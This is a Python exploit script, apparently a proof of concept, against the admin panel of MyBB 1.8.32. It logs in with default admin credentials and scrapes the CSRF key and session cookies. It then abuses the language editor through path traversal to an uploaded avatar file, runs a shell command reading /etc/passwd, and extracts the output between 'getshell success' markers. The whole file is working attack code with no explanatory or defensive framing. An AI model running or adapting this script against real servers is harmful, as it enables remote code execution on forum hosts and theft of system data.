import requests
from bs4 import BeautifulSoup
import re

r_clients = requests.Session()

data1 = {
        "username" : "admin",
        "password" : "123456",
        "do" : "login"
    }

login_txt = r_clients.post("http://www.mybb1832.com/admin/index.php", data=data1).text

if "The username and password combination you entered is invalid" in login_txt:
    print("[-] Login failure. Incorrect credentials supplied")
    exit(0)

print("[+] Login successful!")

if "Access Denied" in login_txt:
    print("[-] Supplied user doesn't have the rights to add a setting")
    exit(0)

soup = BeautifulSoup(login_txt, "lxml")
my_post_key = soup.find_all("input", {"name" : "my_post_key"})[0]['value']
print("[+] my_post_key: ", my_post_key)
print("[+] cookies: ", r_clients.cookies.get_dict())
cookies = r_clients.cookies.get_dict()

data2 = {
    'my_post_key': my_post_key,
    'file': "avatar_1.png",
    'lang': "english",
    'editwith': "..",
    'inadmin': 0
}


exec_url = "http://www.mybb1832.com/admin/index.php?module=config-languages&action=edit&cmd=cat+/etc/passwd"

commands_exec = r_clients.post(exec_url, data=data2, cookies=cookies)

if commands_exec.status_code != 200:
    soup = BeautifulSoup(commands_exec.text, "lxml")
    error_txt = soup.find_all("div", {"class" : "error"})[0].text
    print("[-] command exec didn't work. Reason: '{}'".format(error_txt))
    exit(0)


cmd_output = re.findall(r'<getshell success>(.*?)<getshell success>', commands_exec.text, re.S)

print("[+] exec status: ", commands_exec.status_code)
print("[+] command exec success:\n\n", cmd_output[0].replace("\n", "\n"))
